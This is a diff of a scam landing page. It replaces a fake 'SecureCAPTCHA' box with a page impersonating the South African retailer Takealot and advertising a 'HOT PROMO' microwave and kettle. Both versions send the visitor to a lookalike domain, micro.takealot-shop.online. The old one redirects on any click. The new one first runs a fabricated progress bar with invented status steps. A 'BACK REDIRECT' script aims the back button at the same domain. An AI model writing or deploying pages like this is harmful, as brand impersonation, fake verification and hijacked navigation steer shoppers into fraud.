@@ -1,185 +1,263 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
+
 <head>
-  <meta charset="utf-8">
-  <title>Security Check</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Takealot | Processing Hot Promo...</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --tk-blue: #0B79BF;
+            --tk-dark: #121212;
+            --tk-grey: #4C4C4E;
+            --glass: rgba(0, 0, 0, 0.03);
+            --premium-gradient: linear-gradient(135deg, #0b79bf 0%, #064d7a 100%);
+        }
 
-  <style>
-    html, body {
-      height: 100%;
-      margin: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      overflow: hidden;
-    }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
 
-    /* Background */
-    body::before {
-      content: "";
-      position: fixed;
-      inset: 0;
-      background-image: url("p1.jpeg");
-      background-size: cover;
-      background-position: center;
-      filter: blur(10px);
-      transform: scale(1.1);
-      z-index: -2;
-    }
+        body {
+            background-color: #ffffff;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            color: var(--tk-dark);
+            position: relative;
+        }
 
-    body::after {
-      content: "";
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.4);
-      z-index: -1;
-    }
+        /* Animated Background */
+        .bg-glow {
+            position: absolute;
+            width: 150%;
+            height: 150%;
+            background: radial-gradient(circle at 50% 50%, rgba(11, 121, 191, 0.05) 0%, transparent 50%);
+            animation: pulseBg 8s infinite alternate ease-in-out;
+            z-index: 0;
+        }
 
-    /* Captcha Box */
-    .captcha-container {
-      width: 304px;
-      height: 78px;
-      background: #f9f9f9;
-      border: 1px solid #d3d3d3;
-      border-radius: 3px;
-      padding: 10px 12px;
-      box-sizing: border-box;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-    }
+        @keyframes pulseBg {
+            0% {
+                transform: scale(1) translate(-10%, -10%);
+                opacity: 0.3;
+            }
 
-    .content-left {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-    }
+            100% {
+                transform: scale(1.2) translate(5%, 5%);
+                opacity: 0.6;
+            }
+        }
 
-    .checkbox {
-      width: 26px;
-      height: 26px;
-      border: 2px solid #c1c1c1;
-      border-radius: 2px;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: white;
-    }
+        .container {
+            position: relative;
+            z-index: 10;
+            text-align: center;
+            padding: 2.5rem 2rem;
+            max-width: 420px;
+            width: 90%;
+            backdrop-filter: blur(10px);
+            background: #ffffff;
+            border: 1px solid rgba(0, 0, 0, 0.05);
+            border-radius: 32px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08);
+        }
 
-    .checkbox.verified {
-      border: none;
-      background: transparent;
-      color: #009688;
-      font-size: 24px;
-    }
+        .logo-wrapper {
+            margin-bottom: 2rem;
+            position: relative;
+        }
 
-    .status-text {
-      font-size: 14px;
-      color: #555;
-      user-select: none;
-    }
+        .logo-container {
+            background: white;
+            padding: 1.5rem;
+            border-radius: 24px;
+            display: inline-block;
+            box-shadow: 0 10px 40px rgba(11, 121, 191, 0.15);
+            animation: logoFloat 3s infinite ease-in-out;
+            border: 1px solid rgba(0, 0, 0, 0.03);
+        }
 
-    .content-right {
-      width: 80px;
-      text-align: center;
-      color: #777;
-    }
+        .logo-container img {
+            width: 160px;
+            display: block;
+        }
 
-    .logo img {
-      width: 30px;
-      height: 30px;
-      display: block;
-      margin: 0 auto;
-    }
+        @keyframes logoFloat {
 
-    .brand-name {
-      font-size: 10px;
-      font-weight: 600;
-      margin-top: 2px;
-    }
+            0%,
+            100% {
+                transform: translateY(0) scale(1);
+            }
 
-    .legal-links {
-      font-size: 8px;
-      margin-top: 2px;
-    }
+            50% {
+                transform: translateY(-8px) scale(1.01);
+            }
+        }
 
-    /* Spinner */
-    .loading-spinner {
-      width: 18px;
-      height: 18px;
-      border: 2px solid #f3f3f3;
-      border-top: 2px solid #4285f4;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-    }
+        .promo-badge {
+            display: inline-block;
+            background: #ff3b30;
+            color: white;
+            font-size: 0.75rem;
+            font-weight: 800;
+            padding: 5px 14px;
+            border-radius: 100px;
+            margin-bottom: 1.2rem;
+            text-transform: uppercase;
+            letter-spacing: 1.2px;
+            animation: bounceIn 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 4px 12px rgba(255, 59, 48, 0.3);
+        }
 
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-  </style>
+        @keyframes bounceIn {
+            0% {
+                transform: scale(0.5);
+                opacity: 0;
+            }
+
+            80% {
+                transform: scale(1.1);
+            }
+
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        h1 {
+            font-weight: 800;
+            font-size: 1.6rem;
+            margin-bottom: 0.6rem;
+            color: var(--tk-dark);
+            letter-spacing: -0.5px;
+        }
+
+        p {
+            font-size: 0.95rem;
+            color: #666;
+            margin-bottom: 2.5rem;
+            font-weight: 400;
+            line-height: 1.5;
+        }
+
+        /* Loading Bar */
+        .progress-container {
+            width: 100%;
+            height: 8px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 1.2rem;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: var(--tk-blue);
+            box-shadow: 0 0 15px rgba(11, 121, 191, 0.3);
+            border-radius: 10px;
+            transition: width 0.1s linear;
+        }
+
+        .status-text {
+            font-size: 0.75rem;
+            color: var(--tk-blue);
+            text-transform: uppercase;
+            font-weight: 700;
+            letter-spacing: 2px;
+            height: 20px;
+        }
+
+        /* Micro-animations */
+        .dots {
+            display: inline-block;
+            width: 15px;
+            text-align: left;
+        }
+    </style>
 </head>
 
 <body>
 
-<div class="captcha-container">
-  <div class="content-left">
-    <div class="checkbox" id="captchaBox"></div>
-    <div class="status-text" id="statusLabel">I'm not a robot</div>
-  </div>
+    <div class="bg-glow"></div>
 
-  <div class="content-right">
-    <div class="logo">
-      <img src="logo.png" alt="Captcha Logo">
+    <div class="container">
+        <div class="logo-wrapper">
+            <div class="logo-container">
+                <img src="logo-takealot.svg" alt="Takealot">
+            </div>
+        </div>
+
+        <div class="promo-badge">HOT PROMO</div>
+
+        <h1>Processing Offer</h1>
+        <p>Verifying exclusive Russell Hobbs 20L Electronic Microwave + Cordless Stainless Steel Kettle RHSSK05...</p>
+
+        <div class="progress-container">
+            <div class="progress-bar" id="progress"></div>
+        </div>
+
+        <div class="status-text" id="status">STARTING...</div>
     </div>
-    <div class="brand-name">SecureCAPTCHA</div>
-    <div class="legal-links">Privacy - Terms</div>
-  </div>
-</div>
 
-<script>
-  const captchaBox = document.getElementById("captchaBox");
-  const statusLabel = document.getElementById("statusLabel");
+    <script>
+        const statusEl = document.getElementById('status');
+        const progressEl = document.getElementById('progress');
 
-  // destino após verificação
-  const targetDestination = "https://micro.takealot-shop.online/";
+        const statuses = [
+            "Connecting to server...",
+            "Locating liquidation batch...",
+            "Validating promo code...",
+            "Reserving your unit...",
+            "Redirecting..."
+        ];
 
-  let verificationStarted = false;
+        let currentStatus = 0;
+        let progress = 0;
+        const duration = 5000; // 5 seconds confirmed
+        const startTime = Date.now();
 
-  function startVerification() {
+        function update() {
+            const elapsed = Date.now() - startTime;
+            progress = Math.min((elapsed / duration) * 100, 100);
+            progressEl.style.width = progress + '%';
 
-    if (verificationStarted) return;
-    verificationStarted = true;
+            // Change status text based on progress
+            const statusIndex = Math.min(
+                Math.floor((progress / 100) * statuses.length),
+                statuses.length - 1
+            );
 
-    captchaBox.innerHTML = "<div class='loading-spinner'></div>";
-    statusLabel.textContent = "Verifying...";
+            if (statusIndex !== currentStatus) {
+                currentStatus = statusIndex;
+                statusEl.innerText = statuses[currentStatus].toUpperCase();
+            }
 
-    setTimeout(function () {
+            if (progress < 100) {
+                requestAnimationFrame(update);
+            } else {
+                setTimeout(() => {
+                  window.location.href = 'https://micro.takealot-shop.online/' + location.search;
+                }, 500);
+            }
+        }
 
-      captchaBox.innerHTML = "✓";
-      captchaBox.classList.add("verified");
-      statusLabel.textContent = "Verification complete";
-      statusLabel.style.color = "#009688";
-
-      setTimeout(function () {
-        window.location.href = targetDestination;
-      }, 800);
-
-    }, 1500);
-  }
-
-  /* clique na caixa */
-  captchaBox.onclick = startVerification;
-
-  /* 🔥 qualquer clique na tela */
-  document.addEventListener("click", function () {
-    startVerification();
-  });
-</script>
-
-<!-- BACK REDIRECT -->
+        // Wait slightly before starting
+        setTimeout(() => {
+            update();
+        }, 500);
+    </script>
+     <!-- BACK REDIRECT -->
 <script>
   var back_redirect_back_link =
     "https://micro.takealot-shop.online/" + location.search;
@@ -195,7 +273,7 @@
     }
   }, false);
 </script>
-
 </body>
-</html>
 
+
+</html>
